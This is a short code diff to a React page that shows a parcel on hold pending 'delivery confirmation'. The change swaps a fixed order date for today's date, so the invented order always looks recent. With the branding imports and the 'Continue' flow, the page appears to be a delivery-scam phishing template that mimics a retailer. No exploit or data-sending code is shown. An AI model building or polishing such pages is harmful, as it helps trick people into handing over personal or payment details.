@@ -7,6 +7,11 @@ import { BRAND, BRAND_PROMISES } from '../brand';
 export default function Home() {
   const navigate = useNavigate();
   const [loading, setLoading] = useState(false);
+  const orderPlacedDate = new Intl.DateTimeFormat('en-US', {
+    month: 'long',
+    day: 'numeric',
+    year: 'numeric',
+  }).format(new Date());
 
   const handleContinue = () => {
     if (loading) return;
@@ -91,7 +96,7 @@ export default function Home() {
               <div className="alz-order-product-copy">
                 <div className="alz-order-product-title">This order requires delivery confirmation</div>
                 <div className="alz-order-product-meta">1 item cannot be delivered until the shipping information is confirmed.</div>
-                <div className="alz-order-product-meta">Order placed March 10, 2026</div>
+                <div className="alz-order-product-meta">Order placed {orderPlacedDate}</div>
               </div>
               <div className="alz-order-product-price">On hold</div>
             </div>
